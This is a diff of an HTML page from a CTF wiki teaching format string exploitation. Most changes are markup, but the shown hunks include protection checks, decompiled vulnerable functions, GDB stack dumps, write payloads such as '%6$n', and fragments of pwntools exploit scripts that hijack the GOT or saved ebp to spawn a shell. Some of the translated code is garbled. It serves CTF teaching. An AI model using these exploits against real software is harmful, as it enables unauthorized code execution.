@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -5029,7 +5029,7 @@
 <h3 id="examples">Examples<a class="headerlink" href="#examples" title="Permanent link">&para;</a></h3>
 <p>Here, we introduce the [pwn200 GoodLuck] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck</a>) in UIUCTF in 2017 as an example. . Since there is only a local environment, I have set a flag.txt file locally.</p>
 <h4 id="determining-protection">Determining protection<a class="headerlink" href="#determining-protection" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span>➜  <span class="m">2017</span>-UIUCTF-pwn200-GoodLuck git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec goodluck
+<div class="codehilite"><pre><span></span><code>➜  <span class="m">2017</span>-UIUCTF-pwn200-GoodLuck git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec goodluck
 
     Arch:     amd64-64-little
 
@@ -5040,12 +5040,12 @@
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the program has NX protection and partial RELRO protection enabled.</p>
 <h4 id="_1">分析程序<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h4>
 <p>It can be found that the vulnerability of the program is obvious</p>
-<div class="codehilite"><pre><span></span>  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">21</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+<div class="codehilite"><pre><span></span><code>  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">21</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
 
   <span class="p">{</span>
 
@@ -5069,11 +5069,11 @@
     <span class="p">}</span>
 
   <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h4 id="determining-the-offset">Determining the offset<a class="headerlink" href="#determining-the-offset" title="Permanent link">&para;</a></h4>
 <p>We offset the following at printf, here we only focus on the code part and the stack part.</p>
-<div class="codehilite"><pre><span></span>gef➤  b <span class="nb">printf</span>
+<div class="codehilite"><pre><span></span><code>gef➤  b <span class="nb">printf</span>
 
 Breakpoint <span class="m">1</span> at 0x400640
 
@@ -5134,17 +5134,17 @@ what<span class="s1">&#39;s the flag</span>
 <span class="o">[</span><span class="c1">#1] 0x400890 → Name: main()</span>
 
 ─────────────────────────────────────────────────────────────────────────────────────────────────
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the offset on the stack corresponding to the flag is 5, and the offset is 4 except for the corresponding first behavior return address. In addition, since this is a 64-bit program, the first 6 parameters exist in the corresponding registers, and the fmt string is stored in the RDI register, so the offset of the address corresponding to the fmt string is 10. The order corresponding to <code>%order$s</code> in the fmt string is the order of the arguments after the fmt string, so we only need to type <code>%9$s</code> to get the contents of the flag. Of course, we have an easier way to use fmtarg in <a href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a> to determine the offset of a parameter.</p>
-<div class="codehilite"><pre><span></span>gef➤  fmtarg 0x00007fffffffdb28
+<div class="codehilite"><pre><span></span><code>gef➤  fmtarg 0x00007fffffffdb28
 
 The index of format argument : <span class="m">10</span>
-</pre></div>
+</code></pre></div>
 
 <p>Note that we have to break at printf.</p>
 <h4 id="using-the-program">Using the program<a class="headerlink" href="#using-the-program" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -5169,7 +5169,7 @@ The index of format argument : <span class="m">10</span>
 <span class="nb">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h2 id="hijack-got">hijack GOT<a class="headerlink" href="#hijack-got" title="Permanent link">&para;</a></h2>
 <h3 id="principle_1">Principle<a class="headerlink" href="#principle_1" title="Permanent link">&para;</a></h3>
@@ -5199,7 +5199,7 @@ The index of format argument : <span class="m">10</span>
 </li>
 <li>
 <p>ROP</p>
-<div class="codehilite"><pre><span></span>```text
+<div class="codehilite"><pre><span></span><code>```text
 
 pop eax; ret;           # printf@got -&gt; eax
 
@@ -5208,7 +5208,7 @@ pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx
 add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 
 ```
-</pre></div>
+</code></pre></div>
 
 
 </li>
@@ -5220,7 +5220,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 <p>Here we take [pwn3] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3</a>) in the 2016 CCTF as an example.</p>
 <h4 id="determining-protection_1">Determining protection<a class="headerlink" href="#determining-protection_1" title="Permanent link">&para;</a></h4>
 <p>as follows</p>
-<div class="codehilite"><pre><span></span>➜  <span class="m">2016</span>-CCTF-pwn3 git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec pwn3 
+<div class="codehilite"><pre><span></span><code>➜  <span class="m">2016</span>-CCTF-pwn3 git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec pwn3 
 
     Arch:     i386-32-little
 
@@ -5231,12 +5231,12 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the program mainly turns on NX protection. We generally turn on ASLR protection by default.</p>
 <h4 id="_2">分析程序<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
 <p>First analyze the program, you can find that the program seems to mainly implement a password-registered ftp, with three basic functions: get, put, dir. Probably look at the code for each feature and find a format string vulnerability in the get function.</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">get_file</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">get_file</span><span class="p">()</span>
 
 <span class="p">{</span>
 
@@ -5272,7 +5272,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 
 <span class="k">return</span> <span class="n">printf</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">dest</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h4 id="exploiting-ideas">Exploiting ideas<a class="headerlink" href="#exploiting-ideas" title="Permanent link">&para;</a></h4>
 <p>Since there is a format string vulnerability, we can determine the following ideas</p>
@@ -5285,7 +5285,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 </ul>
 <h4 id="vulnerability-program">Vulnerability Program<a class="headerlink" href="#vulnerability-program" title="Permanent link">&para;</a></h4>
 <p>as follows</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
 
@@ -5419,7 +5419,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 <span class="n">show_dir</span><span class="p">()</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>note</p>
 <ul>
@@ -5432,7 +5432,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 <h3 id="examples_2">Examples<a class="headerlink" href="#examples_2" title="Permanent link">&para;</a></h3>
 <p>Here we take [three white hat-pwnme_k0] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three</a> white hats-pwnme_k0) as an example for analysis.</p>
 <h4 id="determining-protection_2">Determining protection<a class="headerlink" href="#determining-protection_2" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span>➜ Three white hats - pwnme_k0 git: <span class="o">(</span>master<span class="o">)</span> ✗ checksec pwnme_k0
+<div class="codehilite"><pre><span></span><code>➜ Three white hats - pwnme_k0 git: <span class="o">(</span>master<span class="o">)</span> ✗ checksec pwnme_k0
     Arch:     amd64-64-little
 
     RELRO:    Full RELRO
@@ -5442,12 +5442,12 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the program mainly opens NX protection and Full RELRO protection. This way we have no way to modify the got table of the program.</p>
 <h4 id="_3">分析程序<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
 <p>A brief analysis, you know that the program seems to mainly implement a function similar to account registration, mainly modify the viewing function, and then found a format string vulnerability found in the viewing function.</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="n">__usercall</span> <span class="n">sub_400B07</span> <span class="err">@</span> <span class="o">&lt;</span><span class="n">eax</span><span class="o">&gt;</span> <span class="p">(</span><span class="kt">char</span> <span class="n">format</span> <span class="err">@</span> <span class="o">&lt;</span><span class="n">dil</span><span class="o">&gt;</span> <span class="p">,</span> <span class="kt">char</span> <span class="n">formata</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a4</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="n">__usercall</span> <span class="n">sub_400B07</span> <span class="err">@</span> <span class="o">&lt;</span><span class="n">eax</span><span class="o">&gt;</span> <span class="p">(</span><span class="kt">char</span> <span class="n">format</span> <span class="err">@</span> <span class="o">&lt;</span><span class="n">dil</span><span class="o">&gt;</span> <span class="p">,</span> <span class="kt">char</span> <span class="n">formata</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a4</span><span class="p">)</span>
 <span class="p">{</span>
 
   <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&quot;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mh">0x1AuLL</span><span class="p">);</span>
@@ -5455,14 +5455,14 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 <span class="n">printf</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">formatata</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">Welc0me</span> <span class="n">to</span> <span class="n">sangebaimao</span><span class="o">!</span> <span class="err">\</span> <span class="n">n</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;);</span>
 <span class="k">return</span> <span class="n">printf</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>The output is &amp;a4 + 4. Let’s go back and find out that the password we read in is also</p>
-<div class="codehilite"><pre><span></span>    <span class="n">v6</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code>    <span class="n">v6</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
+</code></pre></div>
 
 <p>Of course, we can also find that the username we read in is 20 bytes from the password.</p>
-<div class="codehilite"><pre><span></span>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your username(max lenth:20): &quot;</span><span class="p">);</span>
+<div class="codehilite"><pre><span></span><code>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your username(max lenth:20): &quot;</span><span class="p">);</span>
 
   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
 
@@ -5483,7 +5483,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">=</span> <span class="n">bufa</span><span class="p">;</span>
 <span class="o">*</span> <span class="p">(</span><span class="n">_</span> <span class="n">QWORD</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
     <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">a4</span><span class="p">;</span>
-</pre></div>
+</code></pre></div>
 
 <p>Ok, this is almost the same. In addition, you can also find that this account password is not paired and not paired.</p>
 <h4 id="using-ideas">Using ideas<a class="headerlink" href="#using-ideas" title="Permanent link">&para;</a></h4>
@@ -5497,7 +5497,7 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 </ul>
 <h4 id="determining-the-offset_1">Determining the offset<a class="headerlink" href="#determining-the-offset_1" title="Permanent link">&para;</a></h4>
 <p>First, let&#39;s first determine the offset. Enter the user name aaaaaaaa, enter the password casually, at the printf(&amp;a4 + 4) function that outputs the password under the breakpoint.</p>
-<div class="codehilite"><pre><span></span>Register Account first!
+<div class="codehilite"><pre><span></span><code>Register Account first!
 
 Input your username(max lenth:20): 
 
@@ -5526,10 +5526,10 @@ Register Success!!
 &gt;1
 
 ...
-</pre></div>
+</code></pre></div>
 
 <p>At this point the stack is</p>
-<div class="codehilite"><pre><span></span>─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
+<div class="codehilite"><pre><span></span><code>─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
 
      0x400b1a                  call   0x400758
 
@@ -5561,12 +5561,12 @@ Register Success!!
 0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;
 
 0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
-</pre></div>
+</code></pre></div>
 
 <p>We can find that the user name we entered is in the third position on the stack, then the position of the format string itself is removed, and the offset is 5 + 3 = 8.</p>
 <h4 id="change-address">Change address<a class="headerlink" href="#change-address" title="Permanent link">&para;</a></h4>
 <p>We will carefully observe the information of the stack at the breakpoint.</p>
-<div class="codehilite"><pre><span></span>0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
+<div class="codehilite"><pre><span></span><code>0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
 
 0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
 
@@ -5581,13 +5581,13 @@ Register Success!!
 0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;
 
 0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
-</pre></div>
+</code></pre></div>
 
 <p>You can see that the second location on the stack stores the return address of the function (in fact, the value stored in the push rip when the show account function is called), and the offset in the format string is 7.</p>
 <p>At the same time, on the stack, the first element stores the rbp of the previous function. So we can get the offset 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38. Then if we know the value of rbp, we know the address of the function return address.</p>
 <p>0x0000000000400d74 is different from 0x00000000004008A6 with only 2 bytes lower, so we can only modify 2 bytes starting at 0x00007fffffffdb48.</p>
 <p>It should be noted here that on some newer systems (such as ubuntu 18.04), the program crash may occur when the return address is directly modified to 0x00000000004008A6. In this case, you can consider modifying the return address to 0x00000000004008AA, that is, directly calling system(&quot;/bin /sh&quot;)</p>
-<div class="codehilite"><pre><span></span>.text:00000000004008A6 sub_4008A6      proc near
+<div class="codehilite"><pre><span></span><code>.text:00000000004008A6 sub_4008A6      proc near
 
 .text:00000000004008A6 ; __unwind {
 
@@ -5606,10 +5606,10 @@ Register Success!!
 .text:00000000004008B6                 pop     rdx
 
 .text: 00000000004008B7 retn
-</pre></div>
+</code></pre></div>
 
 <h4 id="using-the-program_1">Using the program<a class="headerlink" href="#using-the-program_1" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>
 
@@ -5670,7 +5670,7 @@ Register Success!!
 <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h2 id="formatted-string-vulnerability-on-heap">Formatted string vulnerability on heap<a class="headerlink" href="#formatted-string-vulnerability-on-heap" title="Permanent link">&para;</a></h2>
 <h3 id="principle_3">Principle<a class="headerlink" href="#principle_3" title="Permanent link">&para;</a></h3>
@@ -5678,7 +5678,7 @@ Register Success!!
 <h3 id="examples_3">Examples<a class="headerlink" href="#examples_3" title="Permanent link">&para;</a></h3>
 <p>Here we take [contacts] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts</a>) in CSAW 2015 as an example.</p>
 <h4 id="determining-protection_3">Determining protection<a class="headerlink" href="#determining-protection_3" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span>➜  <span class="m">2015</span>-CSAW-contacts git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec contacts
+<div class="codehilite"><pre><span></span><code>➜  <span class="m">2015</span>-CSAW-contacts git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec contacts
 
     Arch:     i386-32-little
 
@@ -5689,12 +5689,12 @@ Register Success!!
     NX:       NX enabled
 
     PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It can be seen that the program not only turns on NX protection but also turns on Canary.</p>
 <h4 id="_4">分析程序<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
 <p>A simple look at the program, found that the program, as the name describes, is a contact-related program that can create, modify, delete, and print contact information. And after reading it carefully, you can find a format string vulnerability when printing contact information.</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">PrintInfo</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">PrintInfo</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">)</span>
 
 <span class="p">{</span>
 
@@ -5708,7 +5708,7 @@ Register Success!!
   <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
 
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>Take a closer look and you can see that this format actually points to the heap.</p>
 <h4 id="using-ideas_1">Using ideas<a class="headerlink" href="#using-ideas_1" title="Permanent link">&para;</a></h4>
@@ -5732,7 +5732,7 @@ Register Success!!
 <h4 id="get-the-relevant-address-and-offset">Get the relevant address and offset<a class="headerlink" href="#get-the-relevant-address-and-offset" title="Permanent link">&para;</a></h4>
 <p>Here we mainly get the system function address, /bin/sh address, the address of the contact description stored on the stack, and the address of the PrintInfo function.</p>
 <p>First, we get the system function address and /bin/sh address according to the libc_start_main_ret address stored on the stack (which is the function that will run when the main function returns). We construct the corresponding contact, then choose to output the contact information, and breakpoints at printf, and run until the printf function of the format string vulnerability, as follows</p>
-<div class="codehilite"><pre><span></span> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;
+<div class="codehilite"><pre><span></span><code> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;
 
    ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
 
@@ -5862,50 +5862,50 @@ gef➤  dereference <span class="nv">$esp</span> l140
 0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  <span class="s2">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]&quot;</span>
 
 0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  <span class="s2">&quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;</span>
-</pre></div>
+</code></pre></div>
 
 <p>We can get it by simple judgment.</p>
-<div class="codehilite"><pre><span></span>0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10
-</pre></div>
+<div class="codehilite"><pre><span></span><code>0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10
+</code></pre></div>
 
 <p>Stored is the return address of __libc_start_main, and uses fmtarg to get the corresponding offset. It can be seen that the offset is 32, then the offset from the format string is 31.</p>
-<div class="codehilite"><pre><span></span>gef➤  fmtarg 0xffffcd7c
+<div class="codehilite"><pre><span></span><code>gef➤  fmtarg 0xffffcd7c
 
 The index of format argument : <span class="m">32</span>
-</pre></div>
+</code></pre></div>
 
 <p>This way we can get the corresponding address. In turn, you can get the corresponding libc according to libc-database, and then get the system function address and /bin/sh function address.</p>
 <p>Second, we can determine that the address 0xffffcd2c of the formatted string stored on the stack is 11 relative to the format string, which is used to construct our contacts.</p>
 <p>Furthermore, we can see that the following address holds the call address of the upper function, and its offset from the format string is 6, so that we can directly modify the value of ebp stored in the upper function.</p>
-<div class="codehilite"><pre><span></span>0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code>0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>
+</code></pre></div>
 
 <h4 id="constructing-a-contact-to-get-the-heap-address">Constructing a contact to get the heap address<a class="headerlink" href="#constructing-a-contact-to-get-the-heap-address" title="Permanent link">&para;</a></h4>
 <p>After learning the above information, we can use the following method to get the heap address and the corresponding ebp address.</p>
-<div class="codehilite"><pre><span></span>[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
-</pre></div>
+<div class="codehilite"><pre><span></span><code>[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
+</code></pre></div>
 
 <p>To get the corresponding corresponding address. The latter bbbb is for the convenience of accepting strings.</p>
 <p>Here, because the stack space requested by the function is the same as the free space, the ebp address we get will not change because we call it again.</p>
 <p>In some environments, the system address will appear \x00, causing 0 truncation when printf will result in the inability to disclose both addresses, so you can modify the payload as follows:</p>
-<div class="codehilite"><pre><span></span>[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
-</pre></div>
+<div class="codehilite"><pre><span></span><code>[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
+</code></pre></div>
 
 <p>If the payload is modified to do this, you need to add a 12 offset to the heap. This ensures that the 0 truncation occurs after the leak.</p>
 <h4 id="modify-ebp">Modify ebp<a class="headerlink" href="#modify-ebp" title="Permanent link">&para;</a></h4>
 <p>Since we need to execute the move command to assign ebp to esp and also need to execute pop ebp to execute the ret instruction, we need to modify ebp to store the value of system address -4. After pop ebp, the esp happens to point to the address of the save system, and the system function can be executed by executing the ret instruction.</p>
 <p>We have already learned the ebp value we want to modify, and we know that the corresponding offset is 11, so we can construct the following payload to modify the corresponding value.</p>
-<div class="codehilite"><pre><span></span>part1 = (heap_addr - 4) / 2
+<div class="codehilite"><pre><span></span><code>part1 = (heap_addr - 4) / 2
 
 part2 = heap_addr - 4 - part1
 
 payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
-</pre></div>
+</code></pre></div>
 
 <h4 id="get-the-shell">Get the shell<a class="headerlink" href="#get-the-shell" title="Permanent link">&para;</a></h4>
 <p>At this time, after executing the format string function, exit to the upper function, we enter 5, exit the program will execute the ret instruction, you can get the shell.</p>
 <h4 id="using-the-program_2">Using the program<a class="headerlink" href="#using-the-program_2" title="Permanent link">&para;</a></h4>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -6048,10 +6048,10 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>In the case of system 0 truncation, exp is as follows:
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>
 
@@ -6171,7 +6171,7 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
 
 <span class="n">io</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="c1">#39;5&amp;#39;)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>It should be noted that this does not stabilize the shell because we have entered a string that is too long. But we have no way to control the address we want to enter in the front. It can only be this way.</p>
 <p>Why do you need to print so much? Because the format string is not on the stack, even if we get the address of the ebp that needs to be changed, there is no way to write this address to the stack, use the $ symbol to locate him; because there is no way to locate, there is no way to use l \ll and other ways to write this address, so only print a lot.</p>
 <h2 id="format-string-blind-hit">Format string blind hit<a class="headerlink" href="#format-string-blind-hit" title="Permanent link">&para;</a></h2>
@@ -6187,19 +6187,19 @@ payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
 <p>Both the source and deployment files are placed in the corresponding folder [fmt_blind_stack] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack</a>).</p>
